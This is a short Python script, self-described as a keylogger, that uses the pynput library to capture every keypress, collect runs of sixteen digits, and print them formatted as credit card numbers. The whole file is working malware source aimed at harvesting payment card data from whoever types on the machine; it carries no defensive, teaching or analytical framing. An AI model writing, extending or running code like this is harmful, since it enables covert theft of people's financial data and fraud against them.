import pynput
from pynput.keyboard import Key, Listener

# keylogger that tries to get credit card number

# VK 0-9
virtual_key_list = [0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39]

credit_list = []

def on_press(key):

    reset_check = False
    try:   
        for i in virtual_key_list:
            if key.vk == i and len(credit_list) < 16:
                
                credit_list.append(chr(key.vk))

                reset_check = True

        if len(credit_list) == 16:
            card_number = ''.join(credit_list)
            formatted_card_number = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
            print(f"card info: {formatted_card_number}")
            credit_list.clear()

        # if key that pressed isn't in virtual_key_list list then clear    
        if reset_check == False:
            print("num combo failed reset!")
            credit_list.clear()

        reset_check = False

    except AttributeError:
        pass

with Listener(on_press=on_press) as listener:
    listener.join()